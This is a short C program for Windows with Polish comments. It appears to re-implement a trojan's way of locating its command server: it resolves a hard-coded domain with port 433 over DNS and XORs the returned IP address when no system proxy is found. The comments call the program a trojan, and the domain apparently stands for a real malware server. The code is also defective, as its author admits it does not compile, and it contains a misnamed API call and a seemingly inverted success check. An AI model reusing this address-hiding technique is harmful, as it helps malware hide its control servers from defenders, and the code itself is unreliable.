#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <Windns.h>
/* run this program using the console pauser or add your own getch, system("pause") or input loop */
#define DNS_NAME "tradeboard.mefound.com:433"

//Nie mogê skompilowaæ bo dev c++ x64 nie ma statycznej biblioteki 
//a niechce mi siê via LoadLibrary...

BOOL hProxy = FALSE;  //W œrodowiskach korpo proxy to w³aœciwie standard wiêc wartoœæ tej flagi bêdzie wynosiæ TRUE
                      //w innych œrodowiskach np. analitycznych ju¿ niekonicznie 
unsigned short getPortFromAddr(char*);
unsigned short getPortFromAddr(char* addr) {
	     char* ptr = addr;
	     while(*ptr++ != ':');
	     *(ptr - 1) = '\0';
	     unsigned short ret = (unsigned short)strtoul(ptr,NULL,0);
	     return ret;
}

int main(int argc, char *argv[]) {
	
	char name[256+1] = {0};
	PDNS_RECORD dnsOut = NULL;
	
	strncpy(&name[0],(char*)DNS_NAME,256);
	
	dnsOut = (PDNS_RECORD)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,sizeof(DNS_RECORD));	
	if(dnsOut != NULL) {
	   DWORD ip = 0;
	   unsigned short port = getPortFromAddr(name);	
	   if( DNSQuery(name, 0x01, 0x08, NULL,&dnsOut,NULL) ) {
	   	   ip = dnsOut->Data.A.IpAddress;
	   	   if(hProxy == FALSE) {    //jeœli trojan nie wykryje ustawieñ proxy w systemie 
	   	      ip ^= 0x4F833D5B;	    //xoruje uzyskany z serwerów dns adres IP
		   }                        //nastêpnie ta wartoœæ bêdzie wykorzystana w strukturze IN_ADDR przy nawi¹zywaniu po³¹czenia (bez proxy)
		   DnsRecordListFree(dnsOut,1); //w przeciwynym wypadku uzyskany adres poprostu nie bêdzie modyfikowany 
		   HeapFree(GetProcessHeap(),HEAP_ZERO_MEMORY,dnsOut);
		   dnsOut = NULL;
	   }
	}
	
	return 0;

}
